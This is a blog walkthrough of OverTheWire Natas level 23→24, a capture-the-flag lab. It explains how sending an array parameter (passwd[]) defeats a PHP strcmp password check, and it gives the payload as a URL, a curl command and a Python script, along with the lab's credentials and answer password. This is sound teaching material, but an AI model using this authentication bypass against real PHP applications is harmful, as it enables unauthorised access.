---
layout: post-with-comments
title: "OverTheWire Natas Level 23 → 24 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-23-to-24/
tags: [overthewire, natas, walkthrough, ctf, web, beginner, php, strcmp, type-juggling]
description: "A step by step tutorial for OverTheWire Natas Level 23 → 24!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-22-to-23/' | relative_url }}">← Previous: Level 22 → 23</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas24.html" target="_blank" rel="noopener">
      Official (Level 24) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-24-to-25/' | relative_url }}">
      Next: Level 24 → 25 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas24.natas.labs.overthewire.org](http://natas24.natas.labs.overthewire.org)

Credentials: **natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd**

```bash
# Using curl (optional):
curl -u natas24:MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd 
  "http://natas24.natas.labs.overthewire.org/?passwd[]=0"
```

![homepage]({{ '/assets/images/natas/level-23-to-24/homepage.jpg' | relative_url }})

---

## Task

The source:

```php
if (array_key_exists("passwd", $_REQUEST)) {
  if (!strcmp($_REQUEST["passwd"], "<censored>")) {
    echo "You are an admin!";
    // print password
  } else {
    echo "Wrong!";
  }
}
```

At first, it looks like we must guess the password.
But look carefully: it uses `strcmp()`.

---

## A little bit of Theory

* `strcmp($a, $b)` returns **0 if strings are equal**.
* But if you pass an **array** instead of a string, PHP will:

  * throw a warning (`expects parameter to be string`),
  * but still return **NULL**, which `== 0`.

So the check passes!

---

## Solution

Just send `passwd[]` as a parameter (an array instead of a string):

```
http://natas24.natas.labs.overthewire.org/?passwd[]=0
```

The server throws a warning but still treats the comparison as valid, giving us the password.

---

### Python version

```python
import requests

url = "http://natas24.natas.labs.overthewire.org/"
auth = ("natas24", "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd")

# Send passwd[] as array
r = requests.get(url, auth=auth, params={"passwd[]": "0"})
print(r.text)
```



![result]({{ '/assets/images/natas/level-23-to-24/result.jpg' | relative_url }})

---

## Password

```
ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
```

---

## Troubleshooting

* **Still “Wrong”?** → Make sure you use `passwd[]` (with square brackets), not just `passwd`.
* **Why does it work?** → Because of PHP’s weak typing and `strcmp`’s unexpected behavior with arrays.
* **No warning visible?** → Sometimes warnings are hidden; but the logic still works.

---

**Boom 🎉** You just bypassed a password check using **array injection + strcmp weakness**. On to **natas25**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
